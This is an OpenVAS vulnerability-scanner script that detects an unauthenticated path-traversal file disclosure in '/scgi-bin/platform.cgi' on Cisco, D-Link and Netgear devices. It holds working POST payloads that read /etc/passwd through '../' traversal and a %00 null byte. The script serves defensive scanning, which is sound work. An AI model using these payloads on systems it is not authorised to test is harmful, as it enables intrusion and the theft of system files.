###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_devices_platform_cgi_lfi_01_16.nasl 6700 2017-07-12 12:16:21Z cfischer $
#
# Multiple Devices '/scgi-bin/platform.cgi' Unauthenticated File Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105500");
 script_version ("$Revision: 6700 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Multiple Devices '/scgi-bin/platform.cgi' Unauthenticated File Disclosure");

 script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39184/");

 script_tag(name: "impact" , value:"An attacker could exploit this vulnerability to read arbitrary files on the device. This may aid in further attacks.");
 script_tag(name: "vuldetect" , value:"Send a special crafted HTTP POST request and check the response.");
 script_tag(name: "solution" , value:"Ask the vendor for an update");
 script_tag(name: "summary" , value:"The remote device is prone to an arbitrary file-disclosure vulnerability because it fails to adequately validate user-supplied input.");
 script_tag(name: "affected" , value:"Devices from Cisco, D-Link and Netgear");
 script_tag(name:"solution_type", value: "NoneAvailable");
 script_tag(name:"qod_type", value:"remote_active");

 script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:16:21 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2016-01-07 15:24:11 +0100 (Thu, 07 Jan 2016)");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 443);
 script_mandatory_keys("Embedded_HTTP_Server/banner");

 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:443 );

banner = get_http_banner( port:port );
if( ! banner || "Server: Embedded HTTP Server" >!< banner ) exit( 0 );

url = '/scgi-bin/platform.cgi';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ( buf !~ "HTTP/1\.[01] 200" ) ) exit( 0 );

if( "netgear" >< tolower( buf ) )
  typ = 'netgear';
else if( "d-link" >< tolower( buf ) || "dlink" >< tolower( buf ) )
  typ = 'dlink';
else
  typ = 'cisco';

if( typ == "cisco" )
  data = 'button.login.home=Se%20connecter&Login.userAgent=openvas&reload=0&SSLVPNUser.Password=openvas&SSLVPNUser.UserName=openvas&thispage=../../../../../../../../../../etc/passwd%00.htm';
else if( typ == "dlink" )
  data = 'thispage=../../../../../../../../../../etc/passwd%00.htm&Users.UserName=admin&Users.Password=openvas&button.login.Users.deviceStatus=Login&Login.userAgent=OpenVAS';
else if( typ == "netgear" )
  data = 'thispage=../../../../../../../../../../etc/passwd%00.htm&USERDBUsers.UserName=admin&USERDBUsers.Password=openvas&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login&Login.userAgent=OpenVAS';

len = strlen( data );

host = http_host_name( port:port );

req = 'POST /scgi-bin/platform.cgi HTTP/1.1\r\n' + 
      'Host: ' + host + '\r\n' + 
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: */*\r\n' + 
      'Content-Length: ' + len + '\r\n' + 
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      '\r\n' +
      data;

buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ( buf =~ "HTTP/1\.[01] 200" ) && ( buf =~ 'root:.*:0:[01]:' || ':xauth:/:/bin/cli' >< buf ) )
{
  report = 'By sending a special crafted POST request to "/scgi-bin/platform.cgi" it was possible to read the file "/etc/passwd".\nThe following response was received:\n\n' + buf;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );

